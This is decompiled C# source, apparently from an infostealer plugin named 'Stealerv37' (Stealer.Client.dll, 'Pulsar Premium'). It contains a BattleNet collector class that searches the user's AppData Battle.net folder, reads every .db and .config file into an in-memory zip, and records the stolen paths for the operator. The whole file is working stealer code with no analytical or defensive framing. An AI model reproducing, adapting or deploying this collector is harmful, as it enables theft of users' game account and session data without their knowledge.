// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.BattleNet
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class BattleNet : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
    if (!Directory.Exists(path))
      return;
    string[] strArray = new string[2]{ "*.db", "*.config" };
    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
    {
      Name = nameof (BattleNet)
    };
    foreach (string searchPattern in strArray)
    {
      foreach (string file in Directory.GetFiles(path, searchPattern, SearchOption.AllDirectories))
      {
        try
        {
          FileInfo fileInfo = new FileInfo(file);
          string entryPath = Path.Combine(Path.Combine(nameof (BattleNet), fileInfo.Directory?.Name == "Battle.net" ? "" : fileInfo.Directory?.Name), fileInfo.Name);
          zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
          counterApplications.Files.Add($"{fileInfo.FullName} => {entryPath}");
        }
        catch
        {
        }
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("BattleNet\\");
    counter.Games.Add(counterApplications);
  }
}
